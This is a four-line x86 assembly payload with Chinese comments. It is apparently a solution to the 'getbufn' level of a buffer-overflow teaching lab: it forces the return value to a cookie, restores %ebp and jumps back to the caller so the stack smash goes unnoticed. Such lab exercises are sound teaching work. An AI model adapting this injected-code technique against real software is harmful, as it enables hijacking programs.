movl $0x4da06a04, %eax	# 将返回值修改为 cookie
leal 0x28(%esp), %ebp	# ebp = esp + 28
push $0x8048e15		# 将 call getbufn 的下一条指令的地址压栈
ret
